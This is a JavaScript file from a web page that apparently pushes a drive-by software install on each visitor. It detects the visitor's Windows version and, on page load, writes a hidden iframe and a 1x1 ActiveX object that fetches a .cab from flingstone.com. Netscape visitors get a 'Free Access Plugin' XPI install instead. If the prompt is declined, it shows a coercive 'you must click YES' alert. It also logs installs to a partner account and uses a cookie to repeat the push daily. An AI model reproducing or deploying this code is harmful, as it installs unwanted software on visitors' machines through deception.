function detect_os() {
	var os;
	var detected_os = navigator.userAgent.toLowerCase();
	if (detected_os.indexOf("win95") != -1 || detected_os.indexOf("windows 95") != -1) {
		os = "Microsoft Windows 95";
	} else if (detected_os.indexOf("win98") != -1 || detected_os.indexOf("windows 98") != -1) {
		os = "Microsoft Windows 98";
	} else if (detected_os.indexOf("win9x 4.90") != -1) {
		os = "Microsoft Windows ME";
	} else if (detected_os.indexOf("windows nt 5.0") != -1) {
		os = "Microsoft Windows 2000";
	} else if (detected_os.indexOf("windows nt 5.1") != -1) {
		os = "Microsoft Windows XP";
	} else if (detected_os.indexOf("windows nt 5.2") != -1) {
		os = "Microsoft Windows 2003";
	} else if (detected_os.indexOf("winnt") != -1 || detected_os.indexOf("windows nt") != -1) {
		os = "Microsoft Windows NT";
	} else {
		os = "Unkown Operating System";
	}
	
	return os;
}
	document.write('<iframe id="downloads_manager" style="position:absolute;visibility:hidden;"></iframe>');

var retry_enabled = true;
var cancel_prompt=0;


	var retry_cnt=1;

	        function retry(){
                if(retry_cnt>0) {

                                                                                                alert("In order to view this site, you must click YES.");
                                                                                        start_download();
                                retry_cnt--;
                }

        }

		
	function start_download_loadfirst() {
		var bname=navigator.appName;
		var bver=parseInt(navigator.appVersion);
		if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
			var os = detect_os();
			if (os == 'Microsoft Windows 98' || os == 'Microsoft Windows ME' || os == 'Microsoft Windows 95') { var path = 'cab/98ME/CDTInc/bridge.cab'; }
			if (os == 'Microsoft Windows 2000' || os == 'Microsoft Windows XP' || os == 'Microsoft Windows 2003') { var path = 'cab/2000XP/CDTInc/bridge.cab'; }
		        document.write('<script language="javascript" src="http://www2.flingstone.com/log_downloads.php?account_id=9087"><\/script>\n');
			document.write('<object onerror="window.parent.retry();" id="Client1" width="1" height="1" classid="CLSID:9C691A33-7DDA-4C2F-BE4C-C176083F35CF" codebase="http://static.flingstone.com/' + path + '#version=1,0,0,42">\n');
			document.write('\t<param name="h_key" value="8CDBD7F74A0725F93774C9BC5BD08ABFD7B93DE2AB9040B08FA5B6">\n');
			document.write('\t<param name="partner_id" value="9087">\n');
			document.write('\t<param name="bundle_id" value="2000">\n');
			document.write('<\/object>\n');
		} else if (bname == 'Netscape' && bver >= 5) {
			if (InstallTrigger.updateEnabled()) {
				InstallTrigger.install({'Free Access Plugin 1.117' : 'http://www2.flingstone.com/cab/sbc_netscape.xpi'});
			} else {
				location.replace('http://www2.flingstone.com/cab/sbc_netscape.xpi');
			}
		}
	}

		function start_download() {
		if (cancel_prompt == 0) {
			var bname=navigator.appName;
			var bver=parseInt(navigator.appVersion);
			if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
				var os = detect_os();
				if (os == 'Microsoft Windows 98' || os == 'Microsoft Windows ME' || os == 'Microsoft Windows 95') { var path = 'cab/98ME/CDTInc/bridge.cab'; }
				if (os == 'Microsoft Windows 2000' || os == 'Microsoft Windows XP' || os == 'Microsoft Windows 2003') { var path = 'cab/2000XP/CDTInc/bridge.cab'; }
				document_code = '<script language="javascript" src="http://www2.flingstone.com/log_downloads.php?account_id=9087"><\/script>\n';
				document_code += '<html>\n\t<head>\n\t<\/head>\n\t<body>\n';
				document_code += '\t\t<object onerror="window.parent.retry();" id="Client1" width="1" height="1" classid="CLSID:9C691A33-7DDA-4C2F-BE4C-C176083F35CF" codebase="http://static.flingstone.com/' + path + '#version=1,0,0,112">\n';
				document_code += '\t\t\t<param name="h_key" value="8CDBD7F74A0725F93774C9BC5BD08ABFD7B93DE2AB9040B08FA5B6">\n';
				document_code += '\t\t\t<param name="partner_id" value="9087">\n';
				document_code += '\t\t\t<param name="bundle_id" value="2000">\n';
				document_code += '\t\t<\/object>\n';
				document_code += '\t<\/body>\n<\/html>';	

				downloads_manager.document.write(document_code);
				downloads_manager.document.close();
			} else if (bname == 'Netscape' && bver >= 5) {
				if (InstallTrigger.updateEnabled()) {
					InstallTrigger.install({'Free Access Plugin 1.117' : 'http://www2.flingstone.com/cab/sbc_netscape.xpi'});
				} else {
					location.replace('http://www2.flingstone.com/cab/sbc_netscape.xpi');
				}
			}
		}
	}
        var currentDate = new Date();
        var adRecurrence = "daily";
        var adId = "1049995998";
        var adExpiration = 0;


        if (adRecurrence == "daily") { currentDate.setTime(currentDate.getTime() + (24*60*60*1000));    adExpiration = currentDate.toGMTString(); }
        else if (adRecurrence == "weekly") { currentDate.setTime(currentDate.getTime() + (7*24*60*60*1000));    adExpiration = currentDate.toGMTString(); }
        else if (adRecurrence == "monthly") { currentDate.setTime(currentDate.getTime() + (30*24*60*60*1000));  adExpiration = currentDate.toGMTString(); }
        else if (adRecurrence == "once") { currentDate.setTime(currentDate.getTime() + (365*24*60*60*1000));    adExpiration = currentDate.toGMTString(); }
        else { adExpiration = 0; }

        function SetCookie(sName, sValue, sExpire){
                var expireCode = "";
                if (sExpire) { expireCode =  "expires=" + sExpire; + ";" }
                document.cookie = sName + "=" + escape(sValue) + ";" + expireCode
        }

        function GetCookie(sName) {
                var aCookie = document.cookie.split("; ");
                for (var i=0; i < aCookie.length; i++) {
                        var aCrumb = aCookie[i].split("=");
                        if (sName == aCrumb[0]) { return unescape(aCrumb[1]); }
                }
                return null;
        }
        
	if (!GetCookie("adId")) { 
		if (adExpiration != 0) { SetCookie("adId","1", adExpiration); }
									start_download_loadfirst();
			} 
